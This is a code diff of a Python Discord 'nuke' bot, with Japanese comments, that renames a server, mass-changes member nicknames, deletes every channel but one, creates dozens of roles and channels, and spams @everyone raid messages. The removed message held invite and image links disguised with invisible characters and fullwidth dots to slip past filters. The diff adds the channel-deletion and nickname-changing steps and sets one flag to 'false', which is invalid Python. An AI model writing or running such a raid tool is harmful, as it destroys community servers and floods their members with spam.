@@ -25,16 +25,16 @@ INTENTS.members = True
 # --- Names & Counts ---
 GUILD_NEW_NAME         = "おぜう植民地"        # サーバー名
 ROLE_BASE              = "ozeumember"         # ロール名ベース
-ROLE_COUNT             = 50                    # 作成するロール数
+ROLE_COUNT             = 5                    # 作成するロール数
 CHANNEL_BASE           = "ozeu-nuke"          # チャンネル名ベース
-CHANNEL_COUNT          = 50                   # 作成するチャンネル数
+CHANNEL_COUNT          = 20                   # 作成するチャンネル数
 
 # --- Messages ---
-REPEAT_MESSAGE         = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeuozeu [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"
-REPEAT_COUNT           = 50                    # 各チャンネルに送信する回数
+REPEAT_MESSAGE         = "@everyone おぜうの集いに参加！ https://example.com"
+REPEAT_COUNT           = 3                    # 各チャンネルに送信する回数
 
 # --- Nicknames ---
-CHANGE_NICKNAMES       = True
+CHANGE_NICKNAMES       = false
 NICK_BASE              = "おぜう様万歳！"     # ニックネームベース
 NICK_CHUNK_SIZE        = 12
 NICK_CHUNK_SLEEP       = 0.12
@@ -180,6 +180,23 @@ async def nuke(ctx):
     if GUILD_NEW_NAME:
         await guild.edit(name=GUILD_NEW_NAME)
         await backup_channel.send(f"🔁 サーバー名を \"{GUILD_NEW_NAME}\" に変更しました。")
+
+    # change nicknames
+    if CHANGE_NICKNAMES:
+        await backup_channel.send("👥 ニックネーム変更中...")
+        changed_count = await change_all_nicknames(guild, NICK_BASE, chunk_size=NICK_CHUNK_SIZE, chunk_sleep=NICK_CHUNK_SLEEP)
+        await backup_channel.send(f"👥 ニックネーム変更完了: 成功 {changed_count}")
+
+    # delete channels
+    channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
+    for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
+        await asyncio.gather(*(safe_delete_channel(c) for c in group))
+        await asyncio.sleep(DELETE_CHUNK_SLEEP)
+    await asyncio.sleep(POST_DELETE_WAIT)
+
+    # create roles
+    roles = await create_roles(guild, ROLE_COUNT, ROLE_BASE)
+    await backup_channel.send(f"🔨 ロール作成完了 {len(roles)} 個")
 
     # create channels
     created_channels = []
